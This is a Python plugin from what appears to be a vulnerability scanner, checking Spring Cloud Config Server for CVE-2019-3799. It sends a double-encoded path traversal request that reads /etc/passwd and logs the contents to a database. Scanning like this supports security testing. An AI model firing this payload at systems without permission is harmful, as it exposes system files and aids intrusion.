import requests

from celery_app.utils.utils import insert_vuln_db


#Spring Cloud Config Server 任意文件读取漏洞（CVE-2019-3799）
plugin_id=71
default_port_list=[80,443,8080,8001]


def check(host, port=80):
    scheme = 'https' if '443' in str(port) else 'http'
    target = '{}://{}:{}'.format(scheme, host, port)
    uris = [
        "/foo/default/master/..%252F..%252F..%252F..%252F..%252F..%252Fetc%252fpasswd"]
    try:
        targets = ['{}{}'.format(target, uri) for uri in uris]
        requests.packages.urllib3.disable_warnings()
        with requests.Session() as session:
            for target in targets:
                response = session.get(target, timeout=7, verify=False)
                if 'root:x:0' in response.text:
                    output = '/etc/passwd文件内容:\n{}'.format(response.text)
                    insert_vuln_db(host, target, output, plugin_id)
                    return True, host, target, output
    except Exception as error:
        return False
    return False